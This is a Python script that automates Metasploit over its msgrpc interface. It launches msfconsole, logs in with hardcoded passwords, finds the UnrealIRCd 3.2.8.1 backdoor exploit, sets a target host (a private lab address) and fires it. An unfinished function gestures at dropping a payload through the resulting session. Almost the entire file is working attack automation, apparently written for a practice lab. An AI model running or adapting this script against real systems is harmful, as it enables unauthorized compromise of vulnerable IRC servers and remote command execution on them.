import subprocess, threading, time
import msgpack, http.client
import pprint

# using_msf = False

pp = pprint.PrettyPrinter(indent=4)

#msfrpc with a few fixes
class Msfrpc:

    def __init__(self,opts=[]):
        self.host = "127.0.0.1"
        self.port = 55552
        self.token = False
        self.auth = False
        self.client = http.client.HTTPConnection(self.host,self.port)
        self.console_id = ''

    def encode(self, data):
        return msgpack.packb(data)
    def decode(self,data):
        return msgpack.unpackb(data)

    def bytes_to_dict(self,bytes_dict):
        out = {}
        for attrib,value in bytes_dict.items():
            if type(value) is not bytes:
                out.update({attrib.decode('utf-8'):value})
            else:
                out.update({attrib.decode('utf-8'):value.decode('utf-8')})
        return out

    def returnOne(self):
        return 1

    def call(self,meth,opts=[]):
        if self.console_id:
            opts.insert(0,self.console_id)

        if meth != "auth.login":
            opts.insert(0,self.token)

        opts.insert(0,meth)
        params = self.encode(opts)
        self.client.request("POST","/api/",params,{"Content-type" : "binary/message-pack"})
        resp = self.client.getresponse()
        if meth == 'console.write':
            return self.wait()
        else:
            return self.bytes_to_dict(self.decode(resp.read()))

    def wait(self):
        res = self.call('console.read',[])
        pp.pprint(res)
        if res['busy'] == False:
            time.sleep(3)
        while res['busy'] == True:
            time.sleep(1)
            res = self.call('console.read',[])
            pp.pprint(res)
        return res

def start_msfconsole(using_msf, password):
    msf = subprocess.Popen(["msfconsole","-x","load msgrpc ServerHost=127.0.0.1 Pass=%s"%(password)])
    while(using_msf[0] == True):
        try:
            msf.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            pass
    msf.kill()

def exploit(password):
    msf = Msfrpc({})
    msf.auth = msf.call('auth.login',['msf',password])
    msf.token = msf.auth['token']
    msf.console_id = msf.call('console.create')['id']

    try:
        print(msf.console_id)
        msf.call('console.read',[])
        search_res = msf.call('console.write',['search unreal_ircd_3281_backdoor\n'])['data'].split()
        print(search_res)
        exp_path = [line.split()[0] for line in search_res if 'exploit' in line][0]
        msf.call('console.write',['use '+exp_path+'\n'])
        msf.call('console.write',['show options\n'])
        msf.call('console.write',['set RHOST 192.168.171.128\n'])
        msf.call('console.write',['exploit\n'])
        msf.call('console.destroy',[])
        print('done.')
    except Exception as e:
        print(e)
        msf.call('console.destroy',[])

def drop_payload(password):
    msf = Msfrpc({})
    msf.auth = msf.call('auth.login',['msf',password])
    msf.token = msf.auth['token']
    msf.console_id = msf.call('console.create')['id']

    try:
        print(msf.console_id)
        pp.pprint(msf.call('console.read',[]))
        #pp.pprint(msf.call('session.shell_write',["1","id\n"]))
    except Exception as e:
        print(e)


if __name__ == "__main__":
    #start msfrpc
    using_msf = [True]
    password = "ez.exe"
    msfconsole = threading.Thread(target=start_msfconsole, daemon=True,args=(using_msf,password))
    msfconsole.start()
    time.sleep(10)
    
    # connect to msfrpc, select exploit and run it
    msf_exp = threading.Thread(target=exploit, daemon=True,args=(password,))
    msf_exp.start()
    time.sleep(15)
    
    # connect to msfrpc, use session to drop payload


    using_msf[0] = False
    msfconsole.join()
    msf_exp.join()
    subprocess.call(["reset"])

# if __name__ == "__main__":
#     password = "abc123"
#     drop_payload(password)